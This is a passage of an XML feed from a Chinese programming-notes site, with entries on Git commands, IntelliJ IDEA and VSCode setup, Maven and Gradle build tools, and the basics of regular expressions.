<p>不需要全部自己编写，可以到 <a href="https://github.com/github/gitignore" target="_blank" rel="noopener noreferrer">https://github.com/github/gitignore</a> 中进行查询。</p>
<h1 id="git-命令一览" tabindex="-1"> Git 命令一览</h1>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a29acce-f243-4914-9f00-f2988c528412.jpg" width=""> </div><br>
<p>比较详细的地址：http://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf</p>
<h2 id="git常用命令" tabindex="-1"> git常用命令</h2>
<ul>
<li>克隆项目：git clone xxx.git</li>
<li>创建分支：git branch daily/1.0.0</li>
<li>切换分支：git checkout daily/1.0.0</li>
<li>查看本地分支：git branch</li>
<li>查出远程分支：git branch -r</li>
<li>查看本地远程分支:git branch -a</li>
<li>创建并切换分支：git checkout -b daily/1.0.0</li>
<li>删除本地分支：git branch -d daily/1.0.0</li>
<li>强制删除本地分支：git branch -D daily/1.0.0</li>
<li>查看分支状态：git status</li>
<li>添加文件到git: git add file1 file2</li>
<li>添加所有文件: git add .</li>
<li>提交文件: git commit -m'注释'</li>
<li>拉主干：git pull origin master</li>
<li>合并主干：git merge master</li>
<li>更新分支：git pull -u origin daily/1.0.0</li>
<li>推送代码到远端：git push -u origin daily/1.0.0</li>
<li>打tag: git tag publish/1.0.0</li>
<li>发布到主干：git push -u origin publish/1.0.0</li>
</ul>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li><a href="http://rogerdudler.github.io/git-guide/index.zh.html" target="_blank" rel="noopener noreferrer">Git - 简明指南</a></li>
<li><a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html" target="_blank" rel="noopener noreferrer">图解 Git</a></li>
<li><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener noreferrer">廖雪峰 : Git 教程</a></li>
<li><a href="https://learngitbranching.js.org/" target="_blank" rel="noopener noreferrer">Learn Git Branching</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">开发效率</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/IDEA.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/IDEA.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<h1 id="开发效率" tabindex="-1"> 开发效率</h1>
<h2 id="常用快捷键" tabindex="-1"> 常用快捷键</h2>
<ul>
<li>Shift+Shift     搜索所有文件</li>
</ul>
<p>编辑操作</p>
<ul>
<li>Ctrl+Alt+Enter     在当前行前插入一行</li>
<li>Shift+Enter     在当前行下面增加一行</li>
<li>Ctrl+Y     删除当前行</li>
<li>Ctrl+Z     撤销</li>
<li>Ctrl+Shift+Z     反撤销</li>
<li>Ctrl+Alt+L     格式化代码</li>
<li>Ctrl+Shift+U     对选中代码进行大小写转换</li>
</ul>
<p>文件操作</p>
<ul>
<li>Ctrl+F     当前文件查找</li>
<li>Ctrl+Shift+F     全局文件查找</li>
<li>Ctrl+R     当前文件替换</li>
<li>Ctrl+Shift+R     全局文件替换</li>
</ul>
<p>调试</p>
<ul>
<li>F8     单步调试</li>
<li>F9     跳到下一断点或结束调试</li>
<li>F7     单步进入</li>
<li>Shift+F8     单步跳出</li>
</ul>
<p>注释
Ctrl+/     注释/取消注释当前行
Ctrl+Shift+/     注释/取消注释(多行，注释时选中要注释的代码，取消注释时，光标在注释内任意位置即可)</p>
<p>Alt+Enter     错误修复解决方案</p>
<p>文件切换</p>
<ul>
<li>
<p>Alt+上键     将光标移到上一个方法名或类名</p>
</li>
<li>
<p>Alt+下键     将光标移到下一个方法名或文件结尾</p>
</li>
<li>
<p>Alt+左键     切换到前一个打开的文件(打开多个文件时切换文件)</p>
</li>
<li>
<p>Alt+右键     切换到前一个打开的文件(打开多个文件时切换文件)</p>
</li>
<li>
<p>Ctrl+U     光标在方法名或方法内，打开重写、实现的父类方法、接口</p>
</li>
<li>
<p>Ctrl+Alt+B     光标在方法名上,打开方法实现或重写</p>
</li>
<li>
<p>Ctrl+H     查看选择类的继承层次结构</p>
</li>
<li></li>
</ul>
<h2 id="常用插件" tabindex="-1"> 常用插件</h2>
<ul>
<li>Alibaba Java Coding Guidelines</li>
<li>Free Mybatis plugin</li>
<li>Git ToolBox</li>
<li>JSON Parser</li>
<li>Key Promoter</li>
<li>leetcode editor</li>
<li>Lombok</li>
<li>MapStruct Support</li>
<li>Maven Helper</li>
<li>PlantUML</li>
<li>Rainbow Brackets</li>
<li>RestfulTookit</li>
<li>CodeGlance</li>
</ul>
<h1 id="问题及配置" tabindex="-1"> 问题及配置</h1>
<h2 id="默认配置" tabindex="-1"> 默认配置</h2>
<h3 id="file-other-settings-preferences-for-new-projects" tabindex="-1"> File--&gt;Other Settings--&gt;Preferences for New Projects</h3>
<h4 id="maven-配置" tabindex="-1"> Maven 配置</h4>
<ul>
<li>版本</li>
<li>settings</li>
<li>repository</li>
</ul>
<h3 id="file-other-settings-structure-for-new-projects" tabindex="-1"> File--&gt;Other Settings--&gt;Structure for New Projects</h3>
<h2 id="常见配置" tabindex="-1"> 常见配置</h2>
<h3 id="自动导入引用类所在包配置" tabindex="-1"> 自动导入引用类所在包配置</h3>
<p>Editor -&gt; General -&gt; Auto Import</p>
<h3 id="内存使用量展示" tabindex="-1"> 内存使用量展示</h3>
<p>Apperance -&gt; Window Options -&gt; Show Memory indicator</p>
<h3 id="悬浮提示" tabindex="-1"> 悬浮提示</h3>
<p>Editor -&gt; General -&gt; show quick documention</p>
<h3 id="ctrl-鼠标滚轴修改字体大小" tabindex="-1"> Ctrl+鼠标滚轴修改字体大小</h3>
<p>Editor -&gt; General -&gt; change font size (zoom)</p>
<h3 id="显示多行tab" tabindex="-1"> 显示多行Tab</h3>
<p>Editor -&gt; General -&gt; Editor Tabs</p>
<ol>
<li>show tabs in one row 取消勾选</li>
<li>tab limit</li>
</ol>
<h3 id="显示行号和方法分隔符" tabindex="-1"> 显示行号和方法分隔符</h3>
<p>Editor -&gt; General -&gt; Appearance -&gt; show line numbers / show method separators</p>
<h3 id="文档注释" tabindex="-1"> 文档注释</h3>
<p>Editor -&gt; File and Code Templates -&gt; includes -&gt; File Header</p>
<h3 id="文件模板配置" tabindex="-1"> 文件模板配置</h3>
<p>Editor -&gt; File and Code Templates -&gt; File</p>
<p>Class的Java Doc文件注释</p>
<div><pre><code>#<span>if</span> <span>(</span>$<span>{</span>PACKAGE_NAME<span>}</span> <span>&amp;&amp;</span> $<span>{</span>PACKAGE_NAME<span>}</span> <span>!=</span> <span>""</span><span>)</span><span>package</span> $<span>{</span>PACKAGE_NAME<span>}</span><span>;</span>#end
#<span>parse</span><span>(</span><span>"File Header.java"</span><span>)</span>
<span>/**
 * <span>@description</span>：TODO
 * <span>@author</span>     ：chenwei.tjw
 * <span>@date</span>       ：$<span>{</span>DATE<span>}</span> $<span>{</span>TIME<span>}</span>
 */</span>
<span>public</span> <span>class</span> $<span>{</span>NAME<span>}</span> <span>{</span>
<span>}</span>
</code></pre></div><h3 id="注释格式" tabindex="-1"> 注释格式</h3>
<p>Editor -&gt; Code Style -&gt; Java -&gt; Code Generation -&gt; 取消勾选Line comment at first column</p>
<h3 id="leetcode-插件配置" tabindex="-1"> leetcode 插件配置</h3>
<p>LeetCode editor 配置</p>
<p>CodeFileName:</p>
<div><pre><code><span>P</span>$<span>!</span><span>{</span>question<span>.</span>frontendQuestionId<span>}</span>$<span>!</span>velocityTool<span>.</span><span>camelCaseName</span><span>(</span>$<span>{</span>question<span>.</span>titleSlug<span>}</span><span>)</span>
</code></pre></div><p>Codetemplate:</p>
<div><pre><code>$<span>{</span>question<span>.</span>content<span>}</span>

<span>//Java：${question.title}</span>

<span>package</span> <span>com<span>.</span>vika<span>.</span>autumn<span>.</span>leetcode<span>.</span>editor<span>.</span>cn</span><span>;</span>

<span>public</span> <span>class</span> <span>P</span>$<span>{</span>question<span>.</span>frontendQuestionId<span>}</span>$<span>!</span>velocityTool<span>.</span><span>camelCaseName</span><span>(</span>$<span>{</span>question<span>.</span>titleSlug<span>}</span><span>)</span><span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Solution</span> solution <span>=</span> <span>new</span> <span>P</span>$<span>!</span><span>{</span>question<span>.</span>frontendQuestionId<span>}</span>$<span>!</span>velocityTool<span>.</span><span>camelCaseName</span><span>(</span>$<span>{</span>question<span>.</span>titleSlug<span>}</span><span>)</span><span>(</span><span>)</span><span>.</span><span>new</span> <span>Solution</span><span>(</span><span>)</span><span>;</span>
        <span>// TO TEST</span>
    <span>}</span>
    $<span>{</span>question<span>.</span>code<span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="常见问题" tabindex="-1"> 常见问题</h2>
<h3 id="编译器语言版本" tabindex="-1"> 编译器语言版本</h3>
<ul>
<li>Build -&gt; Compiler -&gt; Java Compiler</li>
<li>Project Structure</li>
</ul>
<h3 id="mapstruct-注解不识别" tabindex="-1"> MapStruct 注解不识别</h3>
<p>Build -&gt; Compiler -&gt; Annotation Processors</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">工具</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">开发效率</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/VSCode.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/VSCode.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[

<h1 id="开发效率" tabindex="-1"> 开发效率</h1>
<h2 id="常用插件" tabindex="-1"> 常用插件</h2>
<ul>
<li>Auto Close Tag</li>
<li>Auto Rename Tag</li>
<li>Chinese Language</li>
<li>Color Highlight</li>
<li>Color Picker</li>
<li>ESLint</li>
<li>Java Test Runner</li>
<li>Live Server</li>
<li>Markdown All in One</li>
<li>Maven for Java</li>
<li>Paste Image</li>
<li>Settings Sync</li>
<li>vscode-icons</li>
</ul>
<h2 id="常用配置" tabindex="-1"> 常用配置</h2>
<h3 id="paste-image-配置" tabindex="-1"> Paste Image 配置</h3>
<ul>
<li>文件名前缀：Paste Image: Name Prefix</li>
<li>文件存储地址：Paste Image: Path</li>
</ul>
<div><pre><code>{
    "pasteImage.namePrefix": "mk-",
    "pasteImage.path": "${projectRoot}/assets/cs-note/distribute"
}
</code></pre></div>]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、构建工具的作用</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、构建工具的作用" tabindex="-1"> 一、构建工具的作用</h1>
<p>构建工具是用于构建项目的自动化工具，主要包含以下工作：</p>
<h2 id="依赖管理" tabindex="-1"> 依赖管理</h2>
<p>不再需要手动导入 Jar 依赖包，并且可以自动处理依赖关系，也就是说某个依赖如果依赖于其它依赖，构建工具可以帮助我们自动处理这种依赖关系。</p>
<h2 id="运行单元测试" tabindex="-1"> 运行单元测试</h2>
<p>不再需要在项目代码中添加测试代码，从而避免了污染项目代码。</p>
<h2 id="将源代码转化为可执行文件" tabindex="-1"> 将源代码转化为可执行文件</h2>
<p>包含预处理、编译、汇编、链接等步骤。</p>
<h2 id="将可执行文件进行打包" tabindex="-1"> 将可执行文件进行打包</h2>
<p>不再需要使用 IDE 将应用程序打包成 Jar 包。</p>
<h2 id="发布到生产服务器上" tabindex="-1"> 发布到生产服务器上</h2>
<p>不再需要通过 FTP 将 Jar 包上传到服务器上。</p>
<h1 id="二、java-主流构建工具" tabindex="-1"> 二、Java 主流构建工具</h1>
<p>Ant 具有编译、测试和打包功能，其后出现的 Maven 在 Ant 的功能基础上又新增了依赖管理功能，而最新的 Gradle 又在 Maven 的功能基础上新增了对 Groovy 语言的支持。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/34751bd9-e8e4-4c20-94bc-f7217049fada.png" width="450px"> </div><br>
<p>Gradle 和 Maven 的区别是，它使用 Groovy 这种特定领域语言（DSL）来管理构建脚本，而不再使用 XML 这种标记性语言。因为项目如果庞大的话，XML 很容易就变得臃肿。</p>
<p>例如要在项目中引入 Junit，Maven 的代码如下：</p>
<div><pre><code><span>&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span><span><span>&lt;</span>project</span> <span>xmlns</span><span><span>=</span><span>"</span>http://maven.apache.org/POM/4.0.0<span>"</span></span> <span><span>xmlns:</span>xsi</span><span><span>=</span><span>"</span>http://www.w3.org/2001/XMLSchema-instance<span>"</span></span>
  <span><span>xsi:</span>schemaLocation</span><span><span>=</span><span>"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span>"</span></span><span>></span></span>
   <span><span><span>&lt;</span>modelVersion</span><span>></span></span>4.0.0<span><span><span>&lt;/</span>modelVersion</span><span>></span></span>
 
   <span><span><span>&lt;</span>groupId</span><span>></span></span>jizg.study.maven.hello<span><span><span>&lt;/</span>groupId</span><span>></span></span>
   <span><span><span>&lt;</span>artifactId</span><span>></span></span>hello-first<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
   <span><span><span>&lt;</span>version</span><span>></span></span>0.0.1-SNAPSHOT<span><span><span>&lt;/</span>version</span><span>></span></span>

   <span><span><span>&lt;</span>dependencies</span><span>></span></span>
          <span><span><span>&lt;</span>dependency</span><span>></span></span>
               <span><span><span>&lt;</span>groupId</span><span>></span></span>junit<span><span><span>&lt;/</span>groupId</span><span>></span></span>
               <span><span><span>&lt;</span>artifactId</span><span>></span></span>junit<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
               <span><span><span>&lt;</span>version</span><span>></span></span>4.10<span><span><span>&lt;/</span>version</span><span>></span></span>
               <span><span><span>&lt;</span>scope</span><span>></span></span>test<span><span><span>&lt;/</span>scope</span><span>></span></span>
          <span><span><span>&lt;/</span>dependency</span><span>></span></span>
   <span><span><span>&lt;/</span>dependencies</span><span>></span></span>
<span><span><span>&lt;/</span>project</span><span>></span></span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><p>而 Gradle 只需要几行代码：</p>
<div><pre><code>dependencies <span>{</span>
    testCompile <span>"junit:junit:4.10"</span>
<span>}</span>
</code></pre></div><h1 id="三、maven" tabindex="-1"> 三、Maven</h1>
<h2 id="概述" tabindex="-1"> 概述</h2>
<p>提供了项目对象模型（POM）文件来管理项目的构建。</p>
<h2 id="仓库" tabindex="-1"> 仓库</h2>
<p>仓库的搜索顺序为：本地仓库、中央仓库、远程仓库。</p>
<ul>
<li>本地仓库用来存储项目的依赖库；</li>
<li>中央仓库是下载依赖库的默认位置；</li>
<li>远程仓库，因为并非所有的依赖库都在中央仓库，或者中央仓库访问速度很慢，远程仓库是中央仓库的补充。</li>
</ul>
<h2 id="pom" tabindex="-1"> POM</h2>
<p>POM 代表项目对象模型，它是一个 XML 文件，保存在项目根目录的 pom.xml 文件中。</p>
<div><pre><code><span><span><span>&lt;</span>dependency</span><span>></span></span>
    <span><span><span>&lt;</span>groupId</span><span>></span></span>junit<span><span><span>&lt;/</span>groupId</span><span>></span></span>
    <span><span><span>&lt;</span>artifactId</span><span>></span></span>junit<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
    <span><span><span>&lt;</span>version</span><span>></span></span>4.12<span><span><span>&lt;/</span>version</span><span>></span></span>
    <span><span><span>&lt;</span>scope</span><span>></span></span>test<span><span><span>&lt;/</span>scope</span><span>></span></span>
<span><span><span>&lt;/</span>dependency</span><span>></span></span>
</code></pre></div><p>[groupId, artifactId, version, packaging, classifier] 称为一个项目的坐标，其中 groupId、artifactId、version 必须定义，packaging 可选（默认为 Jar），classifier 不能直接定义的，需要结合插件使用。</p>
<ul>
<li>groupId：项目组 Id，必须全球唯一；</li>
<li>artifactId：项目 Id，即项目名；</li>
<li>version：项目版本；</li>
<li>packaging：项目打包方式。</li>
</ul>
<h2 id="maven-scope" tabindex="-1"> Maven Scope</h2>
<p>scope定义了类包在项目的使用阶段。项目阶段包括： 编译，运行，测试和发布。</p>
<ul>
<li>
<p>compile：默认scope为compile，表示为当前依赖参与项目的编译、测试和运行阶段，属于强依赖。打包之时，会达到包里去。</p>
</li>
<li>
<p>test：该依赖仅仅参与测试相关的内容，包括测试用例的编译和执行，比如定性的Junit。</p>
</li>
<li>
<p>runtime：依赖仅参与运行周期中的使用。一般这种类库都是接口与实现相分离的类库，比如JDBC类库，在编译之时仅依赖相关的接口，在具体的运行之时，才需要具体的mysql、oracle等等数据的驱动程序。此类的驱动都是为runtime的类库。</p>
</li>
<li>
<p>provided：该依赖在打包过程中，不需要打进去，这个由运行的环境来提供，比如tomcat或者基础类库等等，事实上，该依赖可以参与编译、测试和运行等周期，与compile等同。区别在于打包阶段进行了exclude操作。</p>
</li>
<li>
<p>system：使用上与provided相同，不同之处在于该依赖不从maven仓库中提取，而是从本地文件系统中提取，其会参照systemPath的属性进行提取依赖。</p>
</li>
<li>
<p>import：这个是maven2.0.9版本后出的属性，import只能在dependencyManagement的中使用，能解决maven单继承问题，import依赖关系实际上并不参与限制依赖关系的传递性。</p>
</li>
</ul>
<h2 id="依赖原则" tabindex="-1"> 依赖原则</h2>
<h3 id="dependencymanagement与dependencies有何区别" tabindex="-1"> dependencyManagement与dependencies有何区别？</h3>
<p>dependencyManagement常用于父POM对于子模块的依赖管理，所以一般只用于父POM文件；
a. 主要用以统一管理各个依赖的版本号，避免同一个项目对于同一个依赖出现不同版本导致一些版本不兼容之类的问题
b. 用于声明依赖（子模块依赖父POM的引用），将所有的外部包统一到父POM文件，以便于管理维护</p>
<h3 id="_1-依赖路径最短优先原则" tabindex="-1"> 1. 依赖路径最短优先原则</h3>
<div><pre><code>A -> B -> C -> X(1.0)
A -> D -> X(2.0)
</code></pre></div><p>由于 X(2.0) 路径最短，所以使用 X(2.0)。</p>
<h3 id="_2-声明顺序优先原则" tabindex="-1"> 2. 声明顺序优先原则</h3>
<div><pre><code>A -> B -> X(1.0)
A -> C -> X(2.0)
</code></pre></div><p>在 POM 中最先声明的优先，上面的两个依赖如果先声明 B，那么最后使用 X(1.0)。</p>
<h3 id="_3-覆写优先原则" tabindex="-1"> 3. 覆写优先原则</h3>
<p>子 POM 内声明的依赖优先于父 POM 中声明的依赖。</p>
<h3 id="_4-传递依赖" tabindex="-1"> 4. 传递依赖</h3>
<p>第一列表示直接依赖的scope，第一行表示间接依赖的scope
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-27-35.png" alt="" loading="lazy"></p>
<h2 id="解决依赖冲突" tabindex="-1"> 解决依赖冲突</h2>
<p>找到 Maven 加载的 Jar 包版本，使用 <code>mvn dependency:tree</code> 查看依赖树，根据依赖原则来调整依赖在 POM 文件的声明顺序。</p>
<h2 id="常见maven命定" tabindex="-1"> 常见Maven命定</h2>
<ul>
<li>mvn clean compile：清理+编译</li>
<li>mvn clean test：清理+编译+执行测试链接</li>
<li>mvn clean package：清理+编译+打包</li>
<li>mvn clean install：清理+编译+打包+放置本地仓库</li>
<li>mvn archetype:generate：创建项目骨架</li>
<li>mvn dependency:list：查看当前项目的已解析依赖</li>
<li>mvn dependency:tree：查看当前项目的依赖树</li>
<li>mvn dependency:analyze：自动化分析当前项目的依赖</li>
</ul>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li><a href="http://maven.apache.org/pom.html#Dependency_Version_Requirement_Specification" target="_blank" rel="noopener noreferrer">POM Reference</a></li>
<li><a href="https://stackoverflow.com/questions/7249871/what-is-a-build-tool" target="_blank" rel="noopener noreferrer">What is a build tool?</a></li>
<li><a href="https://programmingmitra.blogspot.com/2016/05/java-build-tools-comparisons-ant-vs.html" target="_blank" rel="noopener noreferrer">Java Build Tools Comparisons: Ant vs Maven vs Gradle</a></li>
<li><a href="http://sagioto.github.io/maven2gradle/" target="_blank" rel="noopener noreferrer">maven 2 gradle</a></li>
<li><a href="https://www.imooc.com/learn/833" target="_blank" rel="noopener noreferrer">新一代构建工具 gradle</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、概述</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、概述" tabindex="-1"> 一、概述</h1>
<p>正则表达式用于文本内容的查找和替换。</p>
<p>正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。</p>
<p><a href="https://regexr.com/" target="_blank" rel="noopener noreferrer">正则表达式在线工具</a></p>
<h1 id="二、匹配单个字符" tabindex="-1"> 二、匹配单个字符</h1>
<p><strong>.</strong>  可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；</p>
<p><strong>.</strong>  是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。</p>
<p>正则表达式一般是区分大小写的，但是也有些实现是不区分。</p>
<p><strong>正则表达式</strong></p>
<div><pre><code>nam.
</code></pre></div><p><strong>匹配结果</strong></p>
<p>My  <strong>name</strong>  is Zheng.</p>
<h1 id="三、匹配一组字符" tabindex="-1"> 三、匹配一组字符</h1>
<p><strong>[ ]</strong>  定义一个字符集合；</p>
<p>0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间在 [ ] 中使用。</p>
<p><strong>-</strong>  只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符；</p>
<p><strong>^</strong>  在 [ ] 中是取非操作。</p>
<p><strong>应用</strong></p>
<p>匹配以 abc 为开头，并且最后一个字母不为数字的字符串：</p>
<p><strong>正则表达式</strong></p>
<div><pre><code>abc[^0-9]
</code></pre></div><p><strong>匹配结果</strong></p>
<ol>
<li><strong>abcd</strong></li>
<li>abc1</li>
<li>abc2</li>
</ol>
<h1 id="四、使用元字符" tabindex="-1"> 四、使用元字符</h1>
<h2 id="匹配空白字符" tabindex="-1"> 匹配空白字符</h2>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">[\b]</td>
<td style="text-align:center">回退（删除）一个字符</td>
</tr>
<tr>
<td style="text-align:center">\f</td>
<td style="text-align:center">换页符</td>
</tr>
<tr>
<td style="text-align:center">\n</td>
<td style="text-align:center">换行符</td>
</tr>
<tr>
<td style="text-align:center">\r</td>
<td style="text-align:center">回车符</td>
</tr>
<tr>
<td style="text-align:center">\t</td>
<td style="text-align:center">制表符</td>
</tr>
<tr>
<td style="text-align:center">\v</td>
<td style="text-align:center">垂直制表符</td>
</tr>
</tbody>
</table>
<p>\r\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \n。</p>
<p>\r\n\r\n 可以匹配 Windows 下的空白行，因为它匹配两个连续的行尾标签，而这正是两条记录之间的空白行；</p>
<h2 id="匹配特定的字符类别" tabindex="-1"> 匹配特定的字符类别</h2>
<h3 id="_1-数字元字符" tabindex="-1"> 1. 数字元字符</h3>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\d</td>
<td style="text-align:center">数字字符，等价于 [0-9]</td>
</tr>
<tr>
<td style="text-align:center">\D</td>
<td style="text-align:center">非数字字符，等价于 [^0-9]</td>
</tr>
</tbody>
</table>
<h3 id="_2-字母数字元字符" tabindex="-1"> 2. 字母数字元字符</h3>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\w</td>
<td style="text-align:center">大小写字母，下划线和数字，等价于 [a-zA-Z0-9_]</td>
</tr>
<tr>
<td style="text-align:center">\W</td>
<td style="text-align:center">对 \w 取非</td>
</tr>
</tbody>
</table>
<h3 id="_3-空白字符元字符" tabindex="-1"> 3. 空白字符元字符</h3>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\s</td>
<td style="text-align:center">任何一个空白字符，等价于 [\f\n\r\t\v]</td>
</tr>
<tr>
<td style="text-align:center">\S</td>
<td style="text-align:center">对 \s 取非</td>
</tr>
</tbody>
</table>
<p>\x 匹配十六进制字符，\0 匹配八进制，例如 \x0A 对应 ASCII 字符 10，等价于 \n。</p>
<h1 id="五、重复匹配" tabindex="-1"> 五、重复匹配</h1>
<ul>
<li><strong>+</strong>  匹配 1 个或者多个字符</li>
<li>*<em>*</em> * 匹配 0 个或者多个</li>
<li><strong>?</strong>  匹配 0 个或者 1 个</li>
</ul>
<p><strong>应用</strong></p>
<p>匹配邮箱地址。</p>
<p><strong>正则表达式</strong></p>
<div><pre><code>[\w.]+@\w+\.\w+
</code></pre></div><p>[\w.] 匹配的是字母数字或者 . ，在其后面加上 + ，表示匹配多次。在字符集合 [ ] 里，. 不是元字符；</p>
<p><strong>匹配结果</strong></p>
<p><strong>abc.def<span>@</span>qq.com</strong></p>
<ul>
<li><strong>{n}</strong>  匹配 n 个字符</li>
<li><strong>{m, n}</strong>  匹配 m~n 个字符</li>
<li><strong>{m,}</strong>  至少匹配 m 个字符</li>
</ul>
<p>* 和 + 都是贪婪型元字符，会匹配尽可能多的内容。在后面加 ? 可以转换为懒惰型元字符，例如 *?、+? 和 {m, n}? 。</p>
<p><strong>正则表达式</strong></p>
<div><pre><code>a.+c
</code></pre></div><p>由于 + 是贪婪型的，因此 .+ 会匹配更可能多的内容，所以会把整个 abcabcabc 文本都匹配，而不是只匹配前面的 abc 文本。用懒惰型可以实现匹配前面的。</p>
<p><strong>匹配结果</strong></p>
<p><strong>abcabcabc</strong></p>
<h1 id="六、位置匹配" tabindex="-1"> 六、位置匹配</h1>
<h2 id="单词边界" tabindex="-1"> 单词边界</h2>
<p><strong>\b</strong>  可以匹配一个单词的边界，边界是指位于 \w 和 \W 之间的位置；<strong>\B</strong> 匹配一个不是单词边界的位置。</p>
<p>\b 只匹配位置，不匹配字符，因此 \babc\b 匹配出来的结果为 3 个字符。</p>
<h2 id="字符串边界" tabindex="-1"> 字符串边界</h2>
<p><strong>^</strong>  匹配整个字符串的开头，<strong>$</strong> 匹配结尾。</p>
<p>^ 元字符在字符集合中用作求非，在字符集合外用作匹配字符串的开头。</p>
<p>分行匹配模式（multiline）下，换行被当做字符串的边界。</p>
<p><strong>应用</strong></p>
<p>匹配代码中以 // 开始的注释行</p>
<p><strong>正则表达式</strong></p>
<div><pre><code>^\s*\/\/.*$
